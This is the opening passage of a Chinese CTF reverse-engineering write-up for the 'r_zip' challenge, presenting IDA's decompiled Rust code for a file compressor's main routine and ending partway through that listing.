<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ODJhODU1ZjE3MGM3MGNkMmY5OWZmZTdkMjkxZWUwM2Jfd2ZZa0EwWENsWFRzeUl3ZWY1d2Z1a3NCZEU0ZU0zTGVfVG9rZW46Qm9ISmJQcnVFb0xTWEh4dHExSWNsOGlobkloXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="r-zip"><a href="#r-zip" class="headerlink" title="r_zip"></a>r_zip</h3><p>给了一个elf文件和一个后缀为z的压缩包文件，ida打开分析elf文件的内容</p>
<p>整体代码比较难看，是一个rust程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=N2MxNzZkYzhiMDk1YjdiMjhjMTg5ODg3OWFkMGFlZDJfNkRoUk01S0haTWFVQXY5cnVvVXpOSFU2RjFuNWFoWmxfVG9rZW46QzlwUWJrM0NSb1RuRGx4Yk5GM2NRZ1lxbk5iXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>跟进<code>compress::main::h941fdd1e72b1c523()</code>函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br></pre></td><td class="code"><pre><span class="line">std::env::args::<span class="built_in">hb676cff2dc321ec8</span>(&amp;v78);</span><br><span class="line">  _$LT$std..env..Args$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::<span class="built_in">h330fe880ea407c90</span>(buf, &amp;v78);</span><br><span class="line">  v0 = buf[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( __OFSUB__(-buf[<span class="number">0</span>], <span class="number">1LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v79 + <span class="number">1</span>) != *(&amp;v78 + <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v58 = (*(&amp;v79 + <span class="number">1</span>) - *(&amp;v78 + <span class="number">1</span>)) / <span class="number">0x18uLL</span>;</span><br><span class="line">      v59 = (*(&amp;v78 + <span class="number">1</span>) + <span class="number">8LL</span>);</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v60 = *(v59 - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v60 )</span><br><span class="line">          <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(*v59, v60, <span class="number">1LL</span>);</span><br><span class="line">        v59 += <span class="number">3</span>;</span><br><span class="line">        --v58;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v58 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v79 )</span><br><span class="line">      <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v78, <span class="number">24</span> * v79, <span class="number">8LL</span>);</span><br><span class="line">    v71 = <span class="number">0.0</span>;</span><br><span class="line">LABEL_139:</span><br><span class="line">    buf[<span class="number">0</span>] = &amp;off_5F3A8;</span><br><span class="line">    buf[<span class="number">1</span>] = &amp;dword_0 + <span class="number">1</span>;</span><br><span class="line">    *v67 = <span class="number">8LL</span>;</span><br><span class="line">    *&amp;v67[<span class="number">8</span>] = <span class="number">0LL</span>;</span><br><span class="line">    std::io::stdio::_eprint::<span class="built_in">h591559c675a6c685</span>(buf);</span><br><span class="line">    std::process::exit::<span class="built_in">h76e2716ffe762bad</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v61 = buf[<span class="number">1</span>];</span><br><span class="line">  v1 = <span class="number">3LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">0xAAAAAAAAAAAAAAABLL</span> * ((*(&amp;v79 + <span class="number">1</span>) - *(&amp;v78 + <span class="number">1</span>)) &gt;&gt; <span class="number">3</span>) &gt;= <span class="number">4</span> )</span><br><span class="line">    v1 = <span class="number">0xAAAAAAAAAAAAAAABLL</span> * ((*(&amp;v79 + <span class="number">1</span>) - *(&amp;v78 + <span class="number">1</span>)) &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;v79 + <span class="number">1</span>) - *(&amp;v78 + <span class="number">1</span>) &gt; <span class="number">0x7FFFFFFFFFFFFFE0uLL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = *v67;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3</span> * (<span class="number">8</span> * v1 + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v64 = *v67;</span><br><span class="line">    <span class="built_in">RNvCsiGVaDesi5rv_7___rustc35___rust_no_alloc_shim_is_unstable_v2</span>();</span><br><span class="line">    v2 = <span class="number">8LL</span>;</span><br><span class="line">    v4 = <span class="built_in">RNvCsiGVaDesi5rv_7___rustc12___rust_alloc</span>(<span class="number">3</span> * (<span class="number">8</span> * v1 + <span class="number">8</span>), <span class="number">8LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">LABEL_6:</span><br><span class="line">      alloc::raw_vec::handle_error::<span class="built_in">hf75f86448ab551df</span>(v2, <span class="number">3</span> * (<span class="number">8</span> * v1 + <span class="number">8</span>));</span><br><span class="line">    v5 = v4;</span><br><span class="line">    *&amp;v6 = v1 + <span class="number">1</span>;</span><br><span class="line">    v3 = v64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = &amp;byte_8;</span><br><span class="line">    v6 = <span class="number">0.0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v5 = v0;</span><br><span class="line">  v5[<span class="number">1</span>] = v61;</span><br><span class="line">  v5[<span class="number">2</span>] = v3;</span><br><span class="line">  v75 = v6;</span><br><span class="line">  v76 = v5;</span><br><span class="line">  v77 = <span class="number">1LL</span>;</span><br><span class="line">  *v67 = v79;</span><br><span class="line">  *buf = v78;</span><br><span class="line">  v7 = <span class="number">2LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">5LL</span>; ; i += <span class="number">3LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _$LT$std..env..Args$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::<span class="built_in">h330fe880ea407c90</span>(&amp;v72, buf);</span><br><span class="line">    v62 = v7;</span><br><span class="line">    v9 = v7 - <span class="number">1</span>;</span><br><span class="line">    v10 = v72;</span><br><span class="line">    <span class="keyword">if</span> ( v72 == <span class="number">0x8000000000000000LL</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v11 = v73;</span><br><span class="line">    v12 = v74;</span><br><span class="line">    <span class="keyword">if</span> ( v9 == *&amp;v75 )</span><br><span class="line">    &#123;</span><br><span class="line">      alloc::raw_vec::RawVecInner$LT$A$GT$::reserve::do_reserve_and_handle::<span class="built_in">h4e0a5675c7fc46aa</span>(</span><br><span class="line">        &amp;v75,</span><br><span class="line">        v9,</span><br><span class="line">        <span class="number">0xAAAAAAAAAAAAAAABLL</span> * ((*&amp;v67[<span class="number">8</span>] - buf[<span class="number">1</span>]) &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">      v5 = v76;</span><br><span class="line">    &#125;</span><br><span class="line">    v5[i - <span class="number">2</span>] = v10;</span><br><span class="line">    v5[i - <span class="number">1</span>] = v11;</span><br><span class="line">    v5[i] = v12;</span><br><span class="line">    v77 = v62;</span><br><span class="line">    v7 = v62 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *&amp;v67[<span class="number">8</span>] != buf[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = (*&amp;v67[<span class="number">8</span>] - buf[<span class="number">1</span>]) / <span class="number">0x18</span>;</span><br><span class="line">    v14 = buf[<span class="number">1</span>] + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = *(v14 - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v15 )</span><br><span class="line">        <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(*v14, v15, <span class="number">1LL</span>);</span><br><span class="line">      v14 += <span class="number">3</span>;</span><br><span class="line">      --v13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v13 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *v67 )</span><br><span class="line">    <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(buf[<span class="number">0</span>], <span class="number">24LL</span> * *v67, <span class="number">8LL</span>);</span><br><span class="line">  v16 = v75;</span><br><span class="line">  v17 = v76;</span><br><span class="line">  <span class="keyword">if</span> ( v62 != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v71 = v75;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_139;</span><br><span class="line">  &#125;</span><br><span class="line">  v93 = v76 + <span class="number">6</span>;</span><br><span class="line">  v18 = v76[<span class="number">4</span>];</span><br><span class="line">  std::fs::read::inner::<span class="built_in">h1747fdee54479d58</span>(buf, v18, v76[<span class="number">5</span>]);</span><br><span class="line">  v21 = buf[<span class="number">0</span>];</span><br><span class="line">  v63 = buf[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">0</span>] != <span class="number">0x8000000000000000LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = *v67;</span><br><span class="line">    v23 = (<span class="number">2LL</span> * *v67);</span><br><span class="line">    v71 = v16;</span><br><span class="line">    v69 = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (*v67 &amp; <span class="number">0x4000000000000000LL</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">2LL</span> * *v67 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">RNvCsiGVaDesi5rv_7___rustc35___rust_no_alloc_shim_is_unstable_v2</span>();</span><br><span class="line">      v24 = <span class="number">1LL</span>;</span><br><span class="line">      v18 = <span class="number">1LL</span>;</span><br><span class="line">      v25 = <span class="built_in">RNvCsiGVaDesi5rv_7___rustc12___rust_alloc</span>(v23, <span class="number">1LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v25 )</span><br><span class="line">LABEL_27:</span><br><span class="line">        alloc::raw_vec::handle_error::<span class="built_in">hf75f86448ab551df</span>(v24, v23);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;dword_0 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v70 = v17;</span><br><span class="line">    buf[<span class="number">0</span>] = v23;</span><br><span class="line">    buf[<span class="number">1</span>] = v25;</span><br><span class="line">    *v67 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;v22 != <span class="number">0.0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v92 = (v63 + <span class="number">14</span>);</span><br><span class="line">      *&amp;v65 = <span class="number">0.0</span>;</span><br><span class="line">      v26 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v26 &gt;= <span class="number">0x100</span> )</span><br><span class="line">          v27 = v26 - <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v27 &gt;= v26 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v28 = v26 + <span class="number">1</span>;</span><br><span class="line">        v29 = v26 + <span class="number">2</span>;</span><br><span class="line">        v91 = v26 + <span class="number">3</span>;</span><br><span class="line">        v90 = v26 + <span class="number">4</span>;</span><br><span class="line">        v89 = v26 + <span class="number">5</span>;</span><br><span class="line">        v88 = v26 + <span class="number">6</span>;</span><br><span class="line">        v87 = v26 + <span class="number">7</span>;</span><br><span class="line">        v86 = v26 + <span class="number">8</span>;</span><br><span class="line">        v85 = v26 + <span class="number">9</span>;</span><br><span class="line">        v84 = v26 + <span class="number">10</span>;</span><br><span class="line">        v83 = v26 + <span class="number">11</span>;</span><br><span class="line">        v82 = v26 + <span class="number">12</span>;</span><br><span class="line">        v81 = v26 + <span class="number">13</span>;</span><br><span class="line">        v30 = <span class="number">256LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v26 &lt; <span class="number">0x100</span> )</span><br><span class="line">          v30 = v26;</span><br><span class="line">        v80 = v26 + <span class="number">14</span>;</span><br><span class="line">        v19 = v92;</span><br><span class="line">        v20 = v92 + v26;</span><br><span class="line">        v31 = <span class="number">0LL</span>;</span><br><span class="line">        v32 = v26;</span><br><span class="line">        v33 = <span class="number">0LL</span>;</span><br><span class="line">        v34 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v32 - v30 &gt;= v22 )</span><br><span class="line">          &#123;</span><br><span class="line">            v35 = <span class="number">0</span>;</span><br><span class="line">            v36 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v18 = *(v20 - v30 - <span class="number">14</span>);</span><br><span class="line">            v35 = <span class="number">0</span>;</span><br><span class="line">            v19 = v63;</span><br><span class="line">            v36 = v18 == v63[v26];</span><br><span class="line">            <span class="keyword">if</span> ( v18 == v63[v26] &amp;&amp; v28 &lt; v22 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = v32 - v30 + <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v18 &gt;= v22 )</span><br><span class="line">              &#123;</span><br><span class="line">                v36 = <span class="number">1LL</span>;</span><br><span class="line">                v35 = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v18 = *(v20 - v30 - <span class="number">13</span>);</span><br><span class="line">                v19 = v63[v28];</span><br><span class="line">                v36 = (v18 == v19) + <span class="number">1LL</span>;</span><br><span class="line">                v35 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v18 == v19 &amp;&amp; v29 &lt; v22 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v19 = v32 - v30 + <span class="number">2</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( v19 &gt;= v22 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v36 = <span class="number">2LL</span>;</span><br><span class="line">                    v35 = <span class="number">0</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v19 = *(v20 - v30 - <span class="number">12</span>);</span><br><span class="line">                    v18 = v63[v29];</span><br><span class="line">                    v36 = (v19 != v18) ^ <span class="number">3LL</span>;</span><br><span class="line">                    v35 = v19 == v18;</span><br><span class="line">                    <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v91 &lt; v22 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v19 = v32 - v30 + <span class="number">3</span>;</span><br><span class="line">                      v36 = <span class="number">3LL</span>;</span><br><span class="line">                      v35 = <span class="number">1</span>;</span><br><span class="line">                      <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v19 = *(v20 - v30 - <span class="number">11</span>);</span><br><span class="line">                        v18 = v63[v91];</span><br><span class="line">                        v36 = (v19 == v18) + <span class="number">3LL</span>;</span><br><span class="line">                        <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v90 &lt; v22 )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v19 = v32 - v30 + <span class="number">4</span>;</span><br><span class="line">                          v36 = <span class="number">4LL</span>;</span><br><span class="line">                          <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                          &#123;</span><br><span class="line">                            v19 = *(v20 - v30 - <span class="number">10</span>);</span><br><span class="line">                            v18 = v63[v90];</span><br><span class="line">                            v36 = (v19 != v18) ^ <span class="number">5LL</span>;</span><br><span class="line">                            <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v89 &lt; v22 )</span><br><span class="line">                            &#123;</span><br><span class="line">                              v19 = v32 - v30 + <span class="number">5</span>;</span><br><span class="line">                              v36 = <span class="number">5LL</span>;</span><br><span class="line">                              <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                              &#123;</span><br><span class="line">                                v19 = *(v20 - v30 - <span class="number">9</span>);</span><br><span class="line">                                v18 = v63[v89];</span><br><span class="line">                                v36 = (v19 == v18) + <span class="number">5LL</span>;</span><br><span class="line">                                <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v88 &lt; v22 )</span><br><span class="line">                                &#123;</span><br><span class="line">                                  v19 = v32 - v30 + <span class="number">6</span>;</span><br><span class="line">                                  v36 = <span class="number">6LL</span>;</span><br><span class="line">                                  <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                                  &#123;</span><br><span class="line">                                    v19 = *(v20 - v30 - <span class="number">8</span>);</span><br><span class="line">                                    v18 = v63[v88];</span><br><span class="line">                                    v36 = (v19 != v18) ^ <span class="number">7LL</span>;</span><br><span class="line">                                    <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v87 &lt; v22 )</span><br><span class="line">                                    &#123;</span><br><span class="line">                                      v19 = v32 - v30 + <span class="number">7</span>;</span><br><span class="line">                                      v36 = <span class="number">7LL</span>;</span><br><span class="line">                                      <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                                      &#123;</span><br><span class="line">                                        v19 = *(v20 - v30 - <span class="number">7</span>);</span><br><span class="line">                                        v18 = v63[v87];</span><br><span class="line">                                        v36 = (v19 == v18) + <span class="number">7LL</span>;</span><br><span class="line">                                        <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v86 &lt; v22 )</span><br><span class="line">                                        &#123;</span><br><span class="line">                                          